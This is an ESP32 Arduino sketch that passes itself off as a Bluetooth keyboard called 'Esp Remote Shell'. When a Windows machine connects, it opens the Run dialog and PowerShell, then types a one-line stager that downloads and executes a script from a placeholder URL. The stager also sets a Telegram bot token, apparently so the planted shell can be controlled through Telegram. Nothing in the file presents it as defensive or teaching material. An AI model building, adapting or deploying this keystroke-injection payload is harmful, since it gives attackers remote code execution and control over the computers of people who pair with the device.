#include "BleKeyboard.h"

const String telegramToken = "YOUR-TELEGRAM-BOT-TOKEN";

const String stagerUrl = "https://YOUR-STAGER-FILE-URL";

BleKeyboard bleKeyboard("Esp Remote Shell", "ESP32", 100);

void setup() {
  Serial.begin(115200);
  delay(1000);
  bleKeyboard.begin();
}

void inject(String cmd) {
  if(!bleKeyboard.isConnected()) return;

  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(500);
  bleKeyboard.releaseAll();
  delay(500); 
  
  bleKeyboard.print("powershell");
  bleKeyboard.write(KEY_RETURN);
  delay(500); 

  for(int i = 0; i < cmd.length(); i++) {
    bleKeyboard.write(cmd[i]);
    delay(10); 
  }
  
  delay(500);
  bleKeyboard.write(KEY_RETURN);

}

void executeTask() {
  if(!bleKeyboard.isConnected()) return;

  String stagerPayload = "$global:Token='" + telegramToken + "'; iex(irm '" + stagerUrl + "')";

  inject(stagerPayload);
}

bool executed = false;

void loop() {
  if (bleKeyboard.isConnected() && !executed) {
    delay(1000); 
    executeTask();
    executed = true; 
  }
  delay(500);
}